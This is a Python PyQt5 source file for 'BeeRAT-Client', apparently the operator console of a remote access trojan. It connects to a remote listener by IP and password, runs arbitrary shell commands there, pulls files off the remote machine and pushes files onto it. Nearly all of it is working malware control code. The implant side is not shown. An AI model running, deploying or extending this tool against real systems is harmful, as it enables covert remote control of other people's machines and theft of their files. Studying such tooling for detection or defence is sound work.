import base64
import json
import os
import socket
from PyQt5 import QtTest
from PyQt5 import QtWidgets as qtw
from PyQt5.uic import loadUi


FORMAT = 'utf-8'


class Client(qtw.QWidget):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.script_location = os.path.dirname(__file__)
        self.ui_file = 'client.ui'
        self.ui = loadUi(os.path.join(self.script_location, self.ui_file), self)
        self.ui.pb.clicked.connect(self.connect)
        self.ui.le.returnPressed.connect(self.enter)
        self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)

    def closeEvent(self, event) -> None:
        os._exit(0)

    def clear(self):
        self.ui.tb.clear()

    def print(self, text):
        self.ui.tb.append(text)

    def set_prompt(self, prompt):
        self.ui.le.setPlaceholderText(prompt)

    def get_prompt(self):
        self.send('prompt')
        prompt = self.recv()
        return f'{prompt}$ '

    def disable_ui_elements(self, le1=False, le2=False, pb=False, le=False):
        self.ui.le1.setEnabled(not le1)
        self.ui.le2.setEnabled(not le2)
        self.ui.pb.setEnabled(not pb)
        self.ui.le.setEnabled(not le)

    def connect(self):
        try:
            ip = self.ui.le1.text()
            password = self.ui.le2.text()
            self.print(f'BeeRAT-Client$ connect {ip}')
            self.disable_ui_elements(le1=True, le2=True, pb=True, le=True)
            QtTest.QTest.qWait(100)
            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client.settimeout(1)
            self.client.connect((ip, 55555))
            self.client.settimeout(None)
            self.send(password)
            result = self.recv()
            if result:
                self.print('[+] Connected.')
                self.set_prompt(self.get_prompt())
                self.disable_ui_elements(le1=True, le2=True, pb=True, le=False)
            else:
                self.print('[-] Password is incorrect.')
                self.send(None)
                self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)
        except (ConnectionRefusedError, TimeoutError) as e:
            print(str(e))
            print(type(e))
            self.print('[-] Connection failed.')
            self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)
        except Exception as e:
            print(str(e))
            self.print('[-] Invalid ip.')
            self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)

    def enter(self):
        try:
            command = self.ui.le.text()
            if command == 'upload':
                file_dialog = qtw.QFileDialog.getOpenFileName(self, 'Select a file', '', 'All files (*.*)')
                file_path = file_dialog[0]
                if file_path:
                    self.ui.le.setText(f'upload {file_path}')
                else:
                    self.ui.le.setText("")
            else:
                self.ui.le.setText("")
                self.print(f'{self.get_prompt()}{command}')
                command = command.split(' ')
                QtTest.QTest.qWait(100)
                if command[0] == 'exit':  # 6
                    self.send('exit')
                    self.print('[-] Disconnected.')
                    self.set_prompt('')
                    self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)
                elif command[0] == 'clear':  # 5
                    self.clear()
                elif command[0] == 'download':  # 4
                    file_path = ' '.join(command[1:])
                    self.send(f'downloadable {file_path}')
                    downloadable = self.recv()
                    if downloadable:
                        file_name = os.path.basename(file_path)
                        self.send(' '.join(command))
                        file_content = self.recv()
                        self.print(self.write_file(file_name, file_content))
                    else:
                        self.print(f'download: {file_path}: Not downloadable')
                elif command[0] == 'upload':  # 3
                    file_path = ' '.join(command[1:])
                    if self.uploadable(file_path):
                        file_name = os.path.basename(file_path)
                        file_content = self.read_file(file_path)
                        self.send(f'upload {file_name}')
                        self.send(file_content)
                        self.print(self.recv())
                    else:
                        self.print(f'upload: {file_path}: Not uploadable')
                elif command[0] == 'change-password':  # 2
                    password = ' '.join(command[1:])
                    if len(password) >= 8:
                        self.send(' '.join(command))
                        if self.recv():
                            self.print('[+] Password saved successfully.')
                    else:
                        self.print('[-] password must be at least 8 characters long.')
                else:  # 1
                    command = ' '.join(command)
                    self.send(command)
                    result = self.recv()
                    self.print(result)
                    self.set_prompt(self.get_prompt())
        except ConnectionResetError:
            self.print('[-] Server disconnected.')
            self.set_prompt('')
            self.disable_ui_elements(le1=False, le2=False, pb=False, le=True)
        except Exception as e:
            print(str(e))

    def send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data.encode(FORMAT))

    def recv(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.client.recv(1024).decode(FORMAT)
                return json.loads(json_data)
            except ValueError:
                continue

    def rename_file(self, file_name):
        filename, extension = os.path.splitext(file_name)
        counter = 1
        while os.path.exists(file_name):
            file_name = f'{filename} ({counter}){extension}'
            counter += 1
        return file_name

    def write_file(self, filename, content):
        content = content.encode(FORMAT)
        filename = self.rename_file(filename)
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return f'[+] {filename} downloaded successfully.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read()).decode(FORMAT)

    def uploadable(self, file_path):
        if os.path.isfile(file_path):
            return True
        if os.path.isfile(os.path.join(self.script_location, file_path)):
            return True
        return False


def main():
    app = qtw.QApplication([])
    widget = Client()
    widget.show()
    app.exec_()


if __name__ == '__main__':
    main()
